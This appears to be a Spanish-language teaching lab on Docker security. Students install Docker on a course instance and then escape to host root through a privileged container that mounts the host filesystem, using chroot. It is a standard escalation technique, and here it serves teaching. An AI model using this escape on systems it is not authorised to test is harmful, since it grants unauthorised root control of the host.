# Laboratorio 3: Elevación de privilegios

El objetivo del siguiente laboratorio es explotar una configuración insegura de Docker para escalar privilegios y obtener acceso root en el host de Docker.

## Requisitos previos
1. Accesso SSH a la instancia `docker25-<usuario>-inseguro.jpaniorte.com`
2. Contexto de Docker `inseguro` y `default` definidos. [Guia para crear contextos Docker](./contextos.md)

## Paso 1: Instalación de Docker

Accede a través de SSH a la instancia `docker25-<usuario>-inseguro.jpaniorte.com` y ejecuta los siguientes pasos:

1. Configura el repositorio Docker

        # Add Docker's official GPG key:
        sudo apt-get update
        sudo apt-get install ca-certificates curl
        sudo install -m 0755 -d /etc/apt/keyrings
        sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
        sudo chmod a+r /etc/apt/keyrings/docker.asc

        # Add the repository to Apt sources:
        echo \
        "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
        $(. /etc/os-release && echo "${UBUNTU_CODENAME:-$VERSION_CODENAME}") stable" | \
        sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
        sudo apt-get update

2. Instalación

        sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

3. Verifica la instalación

        sudo docker run hello-world

4. Añadimos el usuario ubuntu al grupo docker en el servidor Ubuntu:

        sudo groupadd docker
        sudo usermod -aG docker $USER
        newgrp docker

5. Comprueba que puedes ejecutar comandos docker sin sudo:

        docker run hello-world

6. Sal de la sesión ssh:
        
        exit

### Paso 2: Arancando un contenedor inseguro

Desde el PC del laboratorio, ejecuta los siguientes comandos:

        docker context use inseguro

Arranca un contenedor inseguro:

        docker run -d --rm --name vulnerable-container \
        --privileged \
        -v /:/host \
        ubuntu:latest sleep infinity

Explota la vulnerabilidad

        docker exec -it vulnerable-container /bin/bash

Dentro del contenedor, accede al sistema de archivos del host:

        cd /host
        ls -la

Deberías ver el sistema de archivos completo del host. Ahora, cambia al usuario root del host ejecutando:

        chroot /host /bin/bash

Esto te dará una shell con permisos de root en la instancia. Confírmalo ejecutando:

        whoami

Realiza varias pruebas para verificar que has elevado privilegios a través de un contenedor inseguro. Por ejemplo, puedes instalar algún paquete apt.


### Paso 3: Prueba en el contexto default

Desde el PC del laboratorio, ejecuta los siguientes comandos:

        docker context use default

Arranca un contenedor inseguro:

        docker run -d --rm --name vulnerable-container \
        --privileged \
        -v /:/host \
        ubuntu:latest sleep infinity

Explota la vulnerabilidad

        docker exec -it vulnerable-container /bin/bash

Dentro del contenedor, accede al sistema de archivos del host:

        cd /host
        ls -la

Deberías ver el sistema de archivos completo del host. Ahora, cambia al usuario root del host ejecutando:

        chroot /host /bin/bash

Esto te dará una shell con permisos de root en la instancia. Confírmalo ejecutando:

        whoami

Contesta a las siguientes preguntas:

- ¿Has podido elevar privilegios con la configuración actual del laboratorio?
